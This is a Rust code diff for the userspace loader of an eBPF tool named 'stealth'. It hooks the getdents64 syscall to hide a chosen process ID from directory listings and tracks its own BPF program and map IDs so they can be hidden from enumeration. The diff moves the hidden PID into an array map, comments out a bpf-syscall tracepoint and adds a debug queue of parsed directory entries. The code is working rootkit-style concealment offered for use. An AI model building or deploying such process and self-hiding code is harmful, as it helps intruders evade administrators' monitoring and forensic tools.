@@ -1,6 +1,9 @@
 use std::{thread, time::Duration};
 
-use aya::{maps::HashMap, EbpfLoader};
+use aya::{
+    maps::{Array, HashMap, Queue},
+    EbpfLoader, Pod,
+};
 use clap::Parser;
 use log::{debug, info, warn};
 use stealth::utils::{
@@ -14,7 +17,33 @@ struct Opt {
     #[clap(long, required = true)]
     pid: String,
 }
+const MAX_PID_LENGTH: usize = 10; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise
 
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub struct HiddenPid {
+    bytes: [u8; MAX_PID_LENGTH],
+    len: usize,
+}
+impl HiddenPid {
+    fn new(str_repr: &str) -> Self {
+        let mut bytes = [0u8; MAX_PID_LENGTH];
+        let len = str_repr.len().min(MAX_PID_LENGTH);
+        bytes[..len].copy_from_slice(str_repr.as_bytes());
+        Self { bytes, len }
+    }
+}
+#[repr(C)]
+#[derive(Debug, Copy, Clone)]
+pub struct QueuedDirent {
+    pub idx: u32,
+    pub bpos: u64,
+    pub d_reclen: u16,
+    pub d_type: u8,
+    pub d_name: [u8; 10],
+}
+unsafe impl Pod for QueuedDirent {}
+unsafe impl Pod for HiddenPid {}
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
     let Opt { pid } = Opt::parse();
@@ -35,29 +64,32 @@ async fn main() -> anyhow::Result<()> {
     }
 
     let tracepoints = vec![
-        SyscallTracepoint::from(("stealth_bpf", "sys_enter_bpf")),
+        //SyscallTracepoint::from(("stealth_bpf", "sys_enter_bpf")),
         SyscallTracepoint::from(("stealth_pid_enter", "sys_enter_getdents64")),
         SyscallTracepoint::from(("stealth_pid_exit", "sys_exit_getdents64")),
     ];
-    let pid: u32 = pid.parse().unwrap();
 
     info!("hide pid: {}", pid);
-    let mut ebpf = EbpfLoader::new()
-        .set_global("HIDDEN_PID", &pid, true)
-        .load(aya::include_bytes_aligned!(
-            "../../target/bpfel-unknown-none/release/stealth"
-        ))?;
+
+    let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
+        "../../target/bpfel-unknown-none/release/stealth"
+    ))?;
     if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
-        // This can happen if you remove all log statements from your eBPF program.
         warn!("failed to initialize eBPF logger: {}", e);
     }
     let mut builder = Builder {
         ebpf: &mut ebpf,
-        tracepoints: tracepoints,
+        tracepoints,
     };
+
     let progs_info = builder.build()?;
 
     let bpf_info = fetch_pids_map_ids(progs_info)?;
+
+    // set hidden pids map
+    let mut hidden_pids_array: Array<_, HiddenPid> =
+        Array::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
+    hidden_pids_array.set(0, HiddenPid::new(&pid), 0).unwrap();
 
     //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
     let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
@@ -101,7 +133,7 @@ async fn main() -> anyhow::Result<()> {
                         let to_insert_prog_id: u32 = match idx < n_active_maps {
                             true => {
                                 let mut id = *to_skip_prog;
-                                for next_id in active_programs.as_slice()[idx..].into_iter() {
+                                for next_id in active_programs.as_slice()[idx..].iter() {
                                     if !prog_ids.contains(next_id) {
                                         id = *next_id;
                                         break;
@@ -127,7 +159,7 @@ async fn main() -> anyhow::Result<()> {
                         let to_insert_map_id: u32 = match idx < n_active_maps {
                             true => {
                                 let mut id = *to_skip_map;
-                                for next_id in active_maps.as_slice()[idx..].into_iter() {
+                                for next_id in active_maps.as_slice()[idx..].iter() {
                                     if !map_ids.contains(next_id) {
                                         id = *next_id;
                                         break;
@@ -169,6 +201,32 @@ async fn main() -> anyhow::Result<()> {
     let ctrl_c = signal::ctrl_c();
     println!("Waiting for Ctrl-C...");
     ctrl_c.await?;
+    let mut parsed: Queue<_, QueuedDirent> =
+        Queue::try_from(ebpf.take_map("PARSED").unwrap()).unwrap();
+    let mut ctr = 0;
+    while let Ok(k) = parsed.pop(0) {
+        // let last_byte = {
+        //     let mut lbyte = 0;
+        //     for (idx, &b) in k.iter().rev().enumerate() {
+        //         if b != 0 {
+        //             lbyte = k.len().saturating_sub(1 + idx);
+        //             break;
+        //         };
+        //     }
+        //     lbyte
+        // };
+        // info!(
+        //     "{} last byte={}={}",
+        //     unsafe { std::str::from_utf8_unchecked(&k) },
+        //     k[last_byte],
+        //     unsafe { std::str::from_utf8_unchecked(&k[last_byte..]) }
+        // );
+        info!("{:#?} {}", k, unsafe {
+            std::str::from_utf8_unchecked(&k.d_name)
+        });
+        ctr += 1;
+    }
     println!("Exiting...");
+    info!("{} pid parsed", ctr);
     Ok(())
 }
